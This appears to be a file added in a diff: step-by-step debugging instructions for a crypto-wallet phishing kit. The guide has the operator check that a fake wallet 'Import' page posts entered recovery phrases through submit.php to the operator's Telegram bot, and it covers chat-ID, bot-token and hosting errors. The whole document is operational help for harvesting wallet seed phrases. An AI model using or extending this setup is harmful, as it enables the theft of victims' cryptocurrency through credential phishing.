@@ -1,0 +1,75 @@
+═══════════════════════════════════════════════════════════════
+  DEBUGGING STEPS - Follow These Exactly
+═══════════════════════════════════════════════════════════════
+
+STEP 1: Test Telegram Connection
+───────────────────────────────────────────────────────────────
+1. Upload QUICK_TEST.php to your server
+2. Visit: https://yourdomain.com/QUICK_TEST.php
+3. Check what it says:
+   ✅ If it says "SUCCESS" → Telegram works! Go to Step 2
+   ❌ If it says "FAILED" → Check the error message:
+      • "chat not found" → Your Chat ID is wrong
+      • "Unauthorized" → Your Bot Token is wrong
+      • "Connection error" → Server can't reach Telegram
+
+STEP 2: Test Form Submission
+───────────────────────────────────────────────────────────────
+1. Visit: https://yourdomain.com/TEST_FORM.html
+2. Enter test phrase and click Submit
+3. Check what happens:
+   ✅ If it says "SUCCESS" → Form works! Go to Step 3
+   ❌ If it says "ERROR" → Check the error message
+
+STEP 3: Test Wallet Page
+───────────────────────────────────────────────────────────────
+1. Visit: https://yourdomain.com/wallet/index.html
+2. Open browser console (F12 → Console tab)
+3. Enter a test phrase
+4. Click "Import"
+5. Watch the console - you should see:
+   • "Sending to: /submit.php"
+   • "Response status: 200"
+   • "Response data: {success: true}"
+
+STEP 4: Check Server Logs
+───────────────────────────────────────────────────────────────
+1. Go to cPanel → Error Logs
+2. Look for entries from submit.php
+3. Check for any error messages
+
+═══════════════════════════════════════════════════════════════
+  COMMON ISSUES
+═══════════════════════════════════════════════════════════════
+
+Issue: "chat not found"
+Solution: 
+  • Message @userinfobot on Telegram
+  • Get your Chat ID
+  • Make sure you've sent /start to your bot first
+  • Update config.php with correct Chat ID
+
+Issue: "Unauthorized"
+Solution:
+  • Go to @BotFather on Telegram
+  • Send /mybots
+  • Select your bot
+  • Click "API Token"
+  • Copy the token
+  • Update config.php
+
+Issue: "Connection error" or "Failed to fetch"
+Solution:
+  • Make sure submit.php is in the root directory
+  • Check file permissions (should be 644)
+  • Make sure PHP is enabled on your hosting
+  • Contact hosting support if cURL is disabled
+
+Issue: Form submits but no Telegram message
+Solution:
+  • Check server error logs
+  • Make sure config.php has correct credentials
+  • Test with QUICK_TEST.php first
+
+═══════════════════════════════════════════════════════════════
+
